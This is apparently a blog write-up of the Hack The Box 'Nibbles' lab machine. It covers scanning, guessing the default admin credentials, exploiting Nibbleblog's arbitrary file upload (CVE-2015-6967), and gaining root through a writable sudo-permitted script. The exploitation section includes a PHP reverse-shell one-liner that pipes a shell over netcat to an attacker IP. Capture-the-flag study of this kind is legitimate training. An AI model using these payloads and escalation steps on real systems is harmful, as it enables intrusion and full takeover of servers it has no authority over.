---
layout: post
title: "Hack The Box: Nibbles Writeup"
date: 2026-02-09 12:00:00 +0530
categories: [Writeup, HackTheBox]
tags: [linux, cve, metasploit, nibbles]
image:
  path: /assets/img/headers/nibbles_header.png
  alt: HTB Nibbles Machine
---

## ⚡ Executive Summary
**Nibbles** is an easy Linux machine that features a web application vulnerable to file upload exploitation.

> **Difficulty:** Easy
> **OS:** Linux
> **IP:** 10.10.10.75
{: .prompt-info }

---

## 1. Reconnaissance
We start with an Nmap scan to identify open ports.

```bash
nmap -sC -sV -oA nmap/nibbles 10.10.10.75
```


**Results:**

-   `22/tcp`: SSH (OpenSSH 7.2p2)
    
-   `80/tcp`: HTTP (Apache httpd 2.4.18)
    

### Web Enumeration

Visiting `http://10.10.10.75` reveals a simple "Hello World" page. Checking source code reveals a hidden directory in the comments:

Running `gobuster` against this directory reveals the admin login:

Bash

```
gobuster dir -u [http://10.10.10.75/nibbleblog/](http://10.10.10.75/nibbleblog/) -w /usr/share/wordlists/dirb/common.txt

```

> **Discovery:** Found `/nibbleblog/admin.php` {: .prompt-tip }

----------

## 2. Exploitation (CVE-2015-6967)

We navigate to `admin.php`. Guessing credentials `admin:nibbles` granted access. The version is `4.0.3`, which is vulnerable to **CVE-2015-6967** (Arbitrary File Upload).

### The Shell

We navigate to **Plugins > My Image** and upload a PHP reverse shell script.


```
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 4444 >/tmp/f"); ?>

```

Setting up a listener on our attack box:

```
nc -lvnp 4444

```

Triggering the shell by visiting: `http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php`

**We have a shell as `nibbler`.**

----------

## 3. Privilege Escalation

We unzip `personal.zip` found in the home directory and find a monitoring script. Checking sudo permissions:

Bash

```
sudo -l

```

**Output:**

Plaintext

```
User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh

```

### The Attack Vector

Since the file is owned by us, we can overwrite `monitor.sh` with a command to spawn a root shell.

Bash

```
echo "#!/bin/bash" > monitor.sh
echo "/bin/bash" >> monitor.sh
chmod +x monitor.sh
sudo /home/nibbler/personal/stuff/monitor.sh

```

**Root Flag Captured.** 🚩
